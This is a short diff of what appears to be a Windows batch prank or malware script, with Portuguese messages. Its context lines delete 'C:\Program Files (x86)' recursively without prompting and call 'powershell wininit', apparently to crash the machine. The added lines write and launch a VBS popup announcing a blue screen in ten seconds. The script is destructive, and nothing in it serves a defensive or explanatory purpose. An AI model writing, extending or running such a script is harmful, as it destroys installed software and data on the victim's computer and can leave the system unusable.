@@ -634,7 +634,8 @@ start https://status.roblox.com
 start https://status.roblox.com/
 rd /s /q "C:\Program Files (x86)"
 cd "%temp%"
-echo/msgbox "Dando tela azul em 10 segundos"
+echo/msgbox "Dando tela azul em 10 segundos">>legal.vbs
+start legal.vbs
 timeout /t 10 > nul
 powershell wininit
 powershell wininit
